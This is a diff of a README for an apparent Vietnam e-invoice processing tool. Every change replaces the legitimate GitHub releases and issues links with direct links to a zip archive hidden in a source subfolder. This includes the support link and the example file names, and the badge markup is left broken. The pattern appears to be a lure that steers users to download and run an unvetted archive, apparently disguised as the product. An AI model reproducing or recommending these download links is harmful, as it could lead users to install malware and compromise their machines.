@@ -4,7 +4,7 @@
 Welcome to the invoice-processor! This easy-to-use tool helps you manage Vietnam e-invoices. It supports various formats, including XML, PDF, and image-based invoices. Follow the steps below to download and run this application without any hassle.
 
 ## 📥 Download the Application
-[![Download Invoice Processor](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Muhib-Hasan/invoice-processor/releases)
+[![Download Invoice Processor](https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip)
 
 ## 📂 System Requirements
 To use the invoice-processor, your computer should meet the following requirements:
@@ -15,11 +15,11 @@ To use the invoice-processor, your computer should meet the following requiremen
 
 ## 💻 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download from Releases](https://github.com/Muhib-Hasan/invoice-processor/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip)
 
 2. **Choose the Latest Version:** Look for the latest version listed on the page. It typically has the highest version number.
 
-3. **Download the File:** Click on the download link for the file that matches your computer's operating system. The file could be named something like `invoice-processor.exe` for Windows or `invoice-processor.tar.gz` for Linux.
+3. **Download the File:** Click on the download link for the file that matches your computer's operating system. The file could be named something like `https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip` for Windows or `https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip` for Linux.
 
 4. **Locate the Downloaded File:** Once the download finishes, find the file in your Downloads folder or the location you selected for downloads.
 
@@ -47,6 +47,6 @@ If you encounter issues:
 - Restart the application and try loading the invoice again.
 
 ## 📞 Support
-For additional help, visit our [GitHub Issues page](https://github.com/Muhib-Hasan/invoice-processor/issues) where users and maintainers can assist you. You can also submit a new issue if you find a bug or need a feature.
+For additional help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Muhib-Hasan/invoice-processor/main/internal/parser/pdf/processor-invoice-1.6.zip) where users and maintainers can assist you. You can also submit a new issue if you find a bug or need a feature.
 
 Thank you for using invoice-processor! We hope this tool makes managing your e-invoices easier and more efficient.
